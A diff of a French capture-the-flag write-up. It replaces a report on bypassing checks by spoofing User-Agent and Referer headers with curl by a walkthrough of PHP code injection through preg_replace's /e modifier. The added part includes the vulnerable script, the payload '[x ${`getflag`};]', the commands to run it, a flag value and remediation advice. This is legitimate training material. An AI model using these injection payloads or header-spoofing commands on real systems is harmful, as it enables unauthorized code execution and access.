@@ -1,35 +1,82 @@
-# Rapport de Vulnérabilité : Faille User-Agent et Referer
+# Rapport de Vulnérabilité : Exécution de commande via injection dans une évaluation de regex en PHP
 
-## Nom de la Faille
-
-Manipulation des en-têtes HTTP : User-Agent et Referer
-## OWASP
-**A01:2021 – Contrôles d'accès défaillants**
 ## Description
 
-Cette faille permet à un attaquant de contourner les vérifications côté serveur en manipulant les en-têtes HTTP, notamment le champ "User-Agent" pour simuler un navigateur spécifique et le champ "Referer" pour indiquer l'origine de la requête.
+Dans ce niveau, un binaire exécutable appartenant à `flag06` lit un fichier contenant une expression spéciale, puis le passe à un script PHP (`level06.php`) vulnérable. Ce script utilise une vieille fonction de **regex avec évaluation de code (`preg_replace /e`)**, qui permet l’exécution arbitraire de code PHP. En injectant une expression bien formée, il est possible de faire exécuter une commande système comme `getflag`.
 
-Dans ce cas précis, l'application web vérifie si la requête provient de la page "[https://www.nsa.gov/](https://www.nsa.gov/)" et si le navigateur utilisé est "ft\_bornToSec". En modifiant les en-têtes HTTP via un outil comme curl ou un plugin de navigateur tel que "Modify Header Value", il est possible de tromper le serveur et d'obtenir le flag.
+## Comment Exploiter la Faille
 
-## Commande utilisée
+### Étape 1 : Analyse du script PHP
+
+Fichier `/home/user/level06/level06.php` :
+
+```php
+function y($m) {
+  $m = preg_replace("/\./", " x ", $m);
+  $m = preg_replace("/@/", " y", $m);
+  return $m;
+}
+
+function x($y, $z) {
+  $a = file_get_contents($y);
+  $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
+  $a = preg_replace("/\[/", "(", $a);
+  $a = preg_replace("/\]/", ")", $a);
+  return $a;
+}
+
+$r = x($argv[1], $argv[2]);
+print $r;
+```
+
+La ligne vulnérable est :
+
+```php
+$a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
+```
+
+L’option `/e` dans `preg_replace` exécute le résultat du remplacement comme du **code PHP**. Cela permet d’injecter et d’exécuter du code PHP via le contenu du fichier passé en paramètre.
+
+### Étape 2 : Création du fichier d’injection
+
+On crée un fichier dans `/tmp` avec le contenu suivant :
+
+```bash
+echo '[x ${`getflag`};]' > /tmp/playload
+```
+
+* `${`getflag`}` est une syntaxe PHP valide permettant d’exécuter une commande système
+* L’évaluation via `/e` va transformer cette ligne en un appel effectif à `getflag`
+
+### Étape 3 : Exécution du binaire
+
+Le binaire `level06` exécute le script PHP avec les droits de `flag06`. Il suffit de le lancer en lui donnant notre fichier en argument :
+
+```bash
+./level06 /tmp/playload
+```
+
+### Étape 4 : Récupération du flag
+
+Le flag est affiché dans la sortie :
 
 ```
-curl -H "Referer:https://www.nsa.gov/" -H "User-Agent:ft_bornToSec" http://localhost:8080/\?page\=b7e44c7a40c5f80139f0a50f3650fb2bd8d00b0d24667c4c2ca32c88e13b758f | grep "flag"
+wiok45aaoguiboiki2tuin6ub
 ```
 
-Cette commande envoie une requête avec les en-têtes User-Agent et Referer modifiés.
+---
 
-## Limiter la Faille
+## Comment Résoudre la Faille
 
-Pour prévenir ce type de faille, il est essentiel de :
+Pour corriger cette vulnérabilité :
 
-- Ne pas faire confiance aux en-têtes HTTP pour la gestion des autorisations ou des accès.
-- Utiliser des jetons d'authentification sécurisés et signés pour valider les requêtes.
-- Vérifier l'identité de l'utilisateur via des mécanismes d'authentification robustes, comme les sessions ou les cookies sécurisés.
-- Mettre en place des règles de filtrage côté serveur pour détecter les en-têtes suspects.
+* **Ne jamais utiliser l’option `/e` dans `preg_replace`** : Elle est obsolète et dangereuse (supprimée en PHP 7).
+* **Utiliser des alternatives sûres** : Par exemple, `preg_replace_callback()` avec une fonction anonyme bien contrôlée.
+* **Éviter toute évaluation dynamique** de contenu externe (fichier, entrée utilisateur…).
+* **Séparer le traitement logique des entrées utilisateur** du reste de l’application.
 
 ## Conclusion
 
-Cette vulnérabilité montre l'importance de ne pas se fier aux informations des en-têtes HTTP pour prendre des décisions d'autorisation. La validation côté serveur et l'utilisation de mécanismes d'authentification sécurisés sont indispensables pour éviter les attaques par manipulation d'en-têtes.
+Ce niveau illustre une faille classique d’**exécution de code via une expression régulière mal sécurisée**. L’utilisation de fonctionnalités obsolètes comme `/e` dans `preg_replace` ouvre la voie à l'exécution arbitraire de commandes. C’est un excellent exemple des risques liés à une mauvaise gestion des entrées utilisateur dans des langages dynamiques comme PHP.
 
-
+---
